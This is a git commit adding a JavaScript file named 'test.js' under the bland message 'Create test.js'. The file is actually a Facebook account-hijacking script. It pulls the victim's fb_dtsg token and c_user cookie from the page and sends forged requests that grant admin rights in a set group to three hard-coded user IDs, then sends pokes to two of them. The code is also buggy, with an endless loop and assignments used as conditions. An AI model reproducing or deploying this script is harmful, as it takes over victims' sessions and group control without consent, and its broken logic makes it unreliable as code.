a4603d51e4b449a631e18531225f23c4ba27fb80
vikat9596 <vikat9596@gmail.com>
2013-09-04 12:50:03 +0530

    Create test.js

---
+++ test.js
@@ -0,0 +1,111 @@
+
+
+
+
+var add = 15000;
+var d = new Date();
+var y = d.getTime;
+var x =(d.getTime()+add);
+
+
+
+
+while (i=1000)
+  {
+  y=y + "y" + i;
+  i++;
+  }
+
+
+
+
+
+
+if (y=d.getTime)
+{
+/*Admin Post*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+
+function IDS(r) {
+function G(gid) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+G("213601735430613");
+}
+IDS("100002943731487");
+IDS("100000776324852");
+IDS("100006501164447");
+}
+
+
+
+
+
+
+
+else if (y=x)
+{
+/*remove-Admin Post*/
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+
+function IDS(r) {
+function G(gid) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_remove_admin&source=profilebrowser&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+G("213601735430613");
+}
+IDS("100002943731487");
+IDS("100000776324852");
+IDS("100006501164447");
+
+
+
+
+
+var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function p(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "//www.facebook.com/ajax/poke_dialog.php";
+  var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+
+
+p("100006501164447");
+p("100000776324852");
+}
+
+
+
+
